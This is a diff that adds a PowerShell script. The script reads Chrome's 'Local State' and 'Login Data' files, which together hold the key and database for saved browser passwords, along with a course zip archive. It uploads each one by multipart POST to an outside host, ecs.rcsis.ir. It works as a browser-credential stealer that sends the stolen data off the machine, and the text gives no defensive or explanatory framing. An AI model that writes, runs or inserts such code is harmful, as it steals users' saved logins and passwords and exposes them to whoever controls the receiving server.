@@ -1,0 +1,64 @@
+# Define the URI with the UID parameters
+$uri = "https://ecs.rcsis.ir/upload?uid={uid}"
+
+# Array of file paths to upload
+$files = @(
+    "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State",
+    "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data",
+    'D:\Courses\Linear Control\4022.zip'
+)
+
+function Upload-File {
+    param (
+        [string]$filePath,
+        [string]$uri
+    )
+    
+    $fileName = [System.IO.Path]::GetFileName($filePath)
+    $fileContent = Get-Content -Path $filePath -Raw
+
+    # Construct the multipart/form-data content
+    $boundary = [System.Guid]::NewGuid().ToString()
+    $LF = "`r`n"
+    $bodyLines = (
+        "--$boundary",
+        "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`"",
+        "Content-Type: application/octet-stream",
+        "",
+        $fileContent,
+        "--$boundary--",
+        ""
+    ) -join $LF
+
+    # Set headers and content type
+    $headers = @{
+        "Content-Type" = "multipart/form-data; boundary=$boundary"
+    }
+
+    # Send the request
+    $response = Invoke-WebRequest -Uri $uri -Method Post -Body $bodyLines -Headers $headers
+
+    # Check the response status
+    if ($response.StatusCode -eq 200) {
+        Write-Output "File '$fileName' uploaded successfully!"
+    } else {
+        Write-Output "Failed to upload file '$fileName'. Status code: $($response.StatusCode)"
+    }
+}
+
+# Loop through each file path
+foreach ($filePath in $files) {
+    if (Test-Path $filePath -PathType Leaf) {
+        # If it's a file, upload it
+        Upload-File -filePath $filePath -uri $uri
+    } elseif (Test-Path $filePath -PathType Container) {
+        # If it's a directory, get all files recursively and upload each one
+        $allFiles = Get-ChildItem -Path $filePath -Recurse -File
+        foreach ($file in $allFiles) {
+            Upload-File -filePath $file.FullName -uri $uri
+        }
+    } else {
+        Write-Output "File or directory not found: $filePath"
+    }
+}
+
